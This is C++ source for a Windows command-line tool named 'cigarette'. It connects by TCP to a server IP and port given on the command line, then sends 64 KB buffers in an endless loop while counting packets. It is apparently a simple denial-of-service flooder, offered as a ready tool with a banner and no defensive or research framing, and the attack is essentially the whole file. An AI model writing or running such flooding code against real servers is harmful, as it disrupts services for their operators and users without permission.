#include<iostream>
#include<WinSock2.h>
#include<WS2tcpip.h>
#include<vector>

#pragma comment(lib, "Ws2_32.lib")

int main(int argc, char* argv[])
{

	if (argc != 3)
	{

		std::cout << "\033[1;32m" << "help: cigarette <server ip> <server port>" << "\033[00m" << std::endl;

		return 1;

	}

	SOCKET sock;

	WSADATA wsadata;

	int chck = 0, chck_send = 0, chck_recv = 0, counter = 0;
	
	const int size = 65535;

	struct addrinfo* result = NULL, * s_ptr = NULL, client;

	chck = WSAStartup(MAKEWORD(2, 2), &wsadata);

	char req[size];

	ZeroMemory(req, size);

	memset(req, 'a', strlen(req));

	if (chck != 0)
	{

		std::cout << "\033[1;31m" << "cigarette: wsastartup failed with error = " << chck << "\033[00m" << std::endl;

		return 1;

	}

	system("cls");

	std::cout << "\033[1;37m" << R"(
	
"a, 8a"
 `8, `8)                            ,adPPRg,
  8)  ]8                        ,ad888888888b
 ,8' ,8'                    ,gPPR888888888888
,8' ,8'                 ,ad8""   `Y888888888P
8)  8)              ,ad8""        (8888888""
8,  8,          ,ad8""            d888""
`8, `8,    ,ad8""            ,ad8""
 `8, `" ,ad8""            ,ad8""
    ,gPPR8b           ,ad8""
   dP:::::Yb      ,ad8"" Version 0.2
   8):::::(8  ,ad8""	 Don't lose your way
   Yb:;;;:d888""  
    "8ggg8P"      

	)" << std::endl;

	std::cout << "\033[1;32m" << "cigarette: wsastartup is ok !" << "\033[00m" << std::endl;

	ZeroMemory(&client, sizeof(client));

	client.ai_family = AF_UNSPEC;

	client.ai_socktype = SOCK_STREAM;

	client.ai_protocol = IPPROTO_TCP;

	chck = getaddrinfo(argv[1], argv[2], &client, &result);

	if (chck != 0)
	{

		std::cout << "\033[1;31m" << "cigarette: getaddrinfo failed with error: " << chck << "\033[00m" << std::endl;

		WSACleanup();

		return 1;

	}

	std::cout << "\033[1;32m" << "cigarette: getaddrinfo is ok !" << "\033[00m" << std::endl;

	for (s_ptr = result; s_ptr != NULL; s_ptr = s_ptr->ai_next)
	{

		sock = socket(s_ptr->ai_family, s_ptr->ai_socktype, s_ptr->ai_protocol);

		if (sock == INVALID_SOCKET)
		{

			std::cout << "\033[1;31m" << "cigarette: socket failed with error: " << WSAGetLastError() << "\033[00m" << std::endl;

			WSACleanup();

			return 1;

		}

		std::cout << "\033[1;32m" << "cigarette: socket is ok !" << "\033[00m" << std::endl;

		chck = connect(sock, s_ptr->ai_addr, (int)s_ptr->ai_addrlen);

		if (chck < 0)
		{

			std::cout << "\033[1;31m" << "cigarette: connect failed with error: " << chck << "\033[00m" << std::endl;

			closesocket(sock);

			return 1;

		}

		std::cout << "\033[1;32m" << "cigarette: conected !" << "\033[00m" << std::endl;
	}

	freeaddrinfo(result);


	std::cout << "\033[1;32m" << "cigarette: sending requests..." << "\033[00m" << std::endl;

	while(1)
	{

		chck_send = send(sock, req, (int)sizeof(req), 0);

		if (chck_send == SOCKET_ERROR)
		{

			std::cout << "\033[1;31m" << "\ncigarette: send failed with error: " << WSAGetLastError() << "\033[00m" << std::endl;

			std::cout << "\033[1;32m" << "========================================" << "\033[1;37m" << std::endl;

			return 1;

		}

		counter++;

		std::cout << "\r";

		std::cout << "\033[1;32m" << "cigarette: packets sent: " << "\033[00m";

		std::cout << "\033[1;32m" << counter;

	}

	return 0;

}

